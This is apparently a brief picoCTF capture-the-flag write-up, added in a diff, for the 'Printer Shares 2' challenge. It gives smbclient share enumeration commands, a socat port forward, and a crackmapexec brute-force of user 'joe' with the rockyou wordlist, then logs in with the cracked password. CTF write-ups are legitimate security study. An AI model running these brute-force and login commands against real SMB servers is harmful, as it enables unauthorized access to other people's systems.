@@ -1,0 +1,26 @@
+Printer Shares 2 writeup
+
+1.connect it and also use smbclient to look its file
+
+"smbclient -L //green-hill.picoctf.net -p 61028"
+"smbclient //green-hill.picoctf.net/shares -p 61028"
+
+2.there is a file named "notification.txt", after reading , we know there is a person named "joe"
+
+3.try to access "secure-shares" but we dont have power
+
+"smbclient //green-hill.picoctf.net/secure-shares -p 61028"
+
+4.so we try to use crackmapexec to crack joe's password
+
+"crackmapexec smb 127.0.0.1 -u joe -p /rockyou.txt --local-auth --continue-on-success"
+(rockyou.txt is including a lot of password , you can download it online)
+(because crackmapexec is not available at 61028 , so we need to use command to transfer to our localhost => "sudo socat TCP4-LISTEN:445,fork TCP4:green-hill.picoctf.net:61028")
+
+5.after cracking , we get "joe" password , "popcorn"
+
+6.now we use "smbclient //green-hill.picoctf.net/secure-shares -p 61028 -U joe%popcorn" to get in
+
+7.get flag!
+
+# crackmapexec can be installed in kali linux by "sudo apt install crackmapexec"
